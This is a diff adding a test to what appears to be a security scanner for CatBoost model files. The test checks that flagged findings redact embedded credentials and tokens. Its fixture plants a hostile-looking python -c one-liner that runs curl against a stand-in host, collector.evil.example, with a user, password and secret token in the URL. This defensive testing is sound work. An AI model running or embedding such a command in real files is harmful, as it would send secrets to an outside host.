@@ -142,6 +142,31 @@ def test_scan_detects_network_indicator_warning(tmp_path: Path) -> None:
     assert network_checks[0].severity == IssueSeverity.WARNING
 
 
+def test_scan_redacts_urls_in_catboost_findings(tmp_path: Path) -> None:
+    model_path = tmp_path / "network_secret.cbm"
+    model_path.write_bytes(
+        _build_cbm(
+            [
+                "metadata",
+                (
+                    "python -c \"import os; os.system('curl "
+                    "https://cat_user:cat_pass@collector.evil.example/upload?token=CATBOOST_SECRET#frag')\""
+                ),
+                "download_url=https://cat_user:cat_pass@collector.evil.example/upload?token=CATBOOST_SECRET#frag",
+            ],
+        ),
+    )
+
+    result = CatBoostScanner().scan(str(model_path))
+
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    assert "https://collector.evil.example/upload" in failed_details
+    assert "cat_user" not in failed_details
+    assert "cat_pass" not in failed_details
+    assert "CATBOOST_SECRET" not in failed_details
+    assert "#frag" not in failed_details
+
+
 def test_false_positive_reduction_for_common_exec_system_words(tmp_path: Path) -> None:
     model_path = tmp_path / "false_positive_guard.cbm"
     model_path.write_bytes(
